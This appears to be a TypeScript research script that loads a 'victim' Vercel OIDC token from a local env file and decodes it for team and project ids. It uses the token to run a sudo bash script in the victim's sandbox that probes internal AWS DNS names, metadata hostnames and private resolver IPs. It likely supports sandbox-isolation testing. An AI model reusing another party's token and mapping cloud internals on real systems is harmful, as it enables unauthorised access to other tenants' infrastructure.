import { Sandbox } from "@vercel/sandbox";
import { readFileSync } from "fs";
function loadEnv(file: string): Record<string, string> {
  const out: Record<string, string> = {};
  for (const line of readFileSync(file, "utf8").split("\n")) {
    const m = line.match(/^([A-Z_]+)=(.*)$/);
    if (m) out[m[1]] = m[2].trim();
  }
  return out;
}
const VICTIM = loadEnv("/tmp/vercel-sandbox/victima/.env.local").VERCEL_OIDC_TOKEN!;
const V = JSON.parse(Buffer.from(VICTIM.split(".")[1], "base64url").toString());

const EXPLORE = `#!/bin/bash
set +e
echo "=== 1. default DNS resolution works? (should be forwarded) ==="
timeout 5 getent hosts example.com 2>&1 | head -3
echo "=== 2. resolve internal AWS hostnames ==="
for h in \\
  ip-172-31-0-2.ec2.internal \\
  ip-172-31-0-1.ec2.internal \\
  ip-172-31-0-254.ec2.internal \\
  ip-172-31-16-7.ec2.internal \\
  compute.internal \\
  metadata.ec2.internal \\
  ec2.internal \\
  amazonaws.com \\
  s3.amazonaws.com \\
  ec2.us-east-1.amazonaws.com \\
  ; do
  r=$(timeout 2 getent hosts "$h" 2>&1 | head -1)
  echo "$h -> \${r:-NOHIT}"
done
echo "=== 3. reverse DNS of interesting IPs ==="
for ip in 172.31.0.2 100.64.0.1 172.31.16.7; do
  r=$(timeout 3 nslookup "$ip" 2>&1 | grep -a "name = " | head -1)
  echo "$ip -> \${r:-NOHIT}"
done
echo "=== 4. dig directly to 172.31.0.2 ==="
timeout 4 dig @172.31.0.2 example.com 2>&1 | tail -5
echo "=== 5. dig via gateway ==="
timeout 4 dig @100.64.0.1 example.com 2>&1 | tail -5
echo "=== 6. does resolv.conf resolution hit the proxy or vpc? try TXT/CH ==="
timeout 4 dig +short TXT o-o.myaddr.l.google.com 2>&1 | head -2
timeout 4 dig +short CH TXT version.bind 2>&1 | head -2
echo DONE`;

const SCRIPT = `set +e
cat > /tmp/explore39.sh <<'EXPLORE_EOF'
${EXPLORE}
EXPLORE_EOF
sudo unshare -m --propagation private bash /tmp/explore39.sh 2>&1
echo "=== rc: $? ==="
`;

async function main() {
  const sbx = await Sandbox.get({ name: "victim-np", token: VICTIM, teamId: V.owner_id, projectId: V.project_id });
  const res = await sbx.runCommand("bash", ["-c", SCRIPT], { sudo: true, wait: true, timeout: 120_000 });
  console.log("exit:", res.exitCode);
  console.log(await res.output("both"));
}
main().catch((e) => { console.error("ERR", e.message); process.exit(1); });
